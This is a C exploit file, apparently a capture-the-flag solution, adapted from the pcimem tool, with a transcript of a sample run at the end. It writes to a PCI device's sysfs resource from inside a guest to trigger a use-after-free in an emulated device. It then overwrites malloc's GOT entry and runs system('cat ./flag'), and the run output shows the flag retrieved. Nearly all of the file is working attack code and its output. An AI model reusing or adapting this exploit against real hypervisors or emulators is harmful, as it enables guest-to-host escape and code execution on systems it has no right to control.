/*
  Most of this code is taken from pcimem tool

  https://github.com/billfarrow/pcimem
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>

#define PRINT_ERROR \
    do { \
        fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", \
        __LINE__, __FILE__, errno, strerror(errno)); exit(1); \
    } while(0)

#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

int fd = -1;

char *filename = "/sys/devices/pci0000:00/0000:00:04.0/resource0";
void pcimem(uint64_t target, char access_type, uint64_t writeval) {
  /* Map one page */
  printf("mmap(%d, %ld, 0x%x, 0x%x, %d, 0x%x)\n", 0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, (int) target);
  void *map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target & ~MAP_MASK);
  if(map_base == (void *) -1) PRINT_ERROR;
  printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long) map_base);
  uint64_t read_result;

  int type_width = 0;
  void *virt_addr = map_base + (target & MAP_MASK);
  switch(access_type) {
    case 'b':
      *((uint8_t *) virt_addr) = writeval;
      read_result = *((uint8_t *) virt_addr);
      type_width = 1;
      break;
    case 'h':
      *((uint16_t *) virt_addr) = writeval;
      read_result = *((uint16_t *) virt_addr);
      type_width = 2;
      break;
    case 'w':
      *((uint32_t *) virt_addr) = writeval;
      read_result = *((uint32_t *) virt_addr);
      type_width = 4;
      break;
    case 'd':
      *((uint64_t *) virt_addr) = writeval;
      read_result = *((uint64_t *) virt_addr);
      type_width = 8;
      break;
  }
  printf("Written 0x%0*lX; readback 0x%*lX\n", type_width, writeval, type_width, read_result);
  if(munmap(map_base, MAP_SIZE) == -1) PRINT_ERROR;
}


int main(int argc, char **argv) {

/*
a little change, no need to allocate another chunk, just one.
*/
  if((fd = open(filename, O_RDWR | O_SYNC)) == -1) PRINT_ERROR;
  printf("%s opened.\n", filename);

  pcimem(0x060000, 'b', 0xd); // allocate 1 chunk

  pcimem(0x160000, 'b', 0xd); // free it
  pcimem(0x260000, 'd', 0x131796d); // UAF to overwrite the fd

  //try 4 times or more  
  int i = 0;
  for (i; i < 4; i++) {
    pcimem(i << 16, 'b', 0xd);    // get the fake pointer
  }
  //debugging
  sleep(10);
  for (i = 0; i < 4; i ++) {
    pcimem((0x20 | i) << 16, 'd', 0x1130b78000000); // write malloc@got in pointer array.
  }

  pcimem(0x280000, 'd', 0x6E65F9);  // overwrite malloc@got
  pcimem(0x000000, 'b', 0x10);      // call system("cat ./flag")

  close(fd);
  return 0;
}

/*
/ # ./exp
/sys/devices/pci0000:00/0000:00:04.0/resource0 opened.
mmap(0, 4096, 0x3, 0x1, 3, 0x60000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0xD; readback 0x0
mmap(0, 4096, 0x3, 0x1, 3, 0x160000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0xD; readback 0x40
mmap(0, 4096, 0x3, 0x1, 3, 0x260000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0x0131796D; readback 0x 131796D
mmap(0, 4096, 0x3, 0x1, 3, 0x0)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0xD; readback 0xC0
mmap(0, 4096, 0x3, 0x1, 3, 0x10000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0xD; readback 0xC0
mmap(0, 4096, 0x3, 0x1, 3, 0x20000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0xD; readback 0x6D
mmap(0, 4096, 0x3, 0x1, 3, 0x30000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0xD; readback 0x0
mmap(0, 4096, 0x3, 0x1, 3, 0x200000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0x1130B78000000; readback 0x1130B78000000
mmap(0, 4096, 0x3, 0x1, 3, 0x210000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0x1130B78000000; readback 0x1130B78000000
mmap(0, 4096, 0x3, 0x1, 3, 0x220000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0x1130B78000000; readback 0x1130B78000000
mmap(0, 4096, 0x3, 0x1, 3, 0x230000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0x1130B78000000; readback 0x1130B78000000
mmap(0, 4096, 0x3, 0x1, 3, 0x280000)
PCI Memory mapped to address 0x7fdcc19b0000.
Written 0x006E65F9; readback 0x  6E65F9
mmap(0, 4096, 0x3, 0x1, 3, 0x0)
PCI Memory mapped to address 0x7fdcc19b0000.
flag{ec3's_flag}
flag{ec3's_flag}
......
*/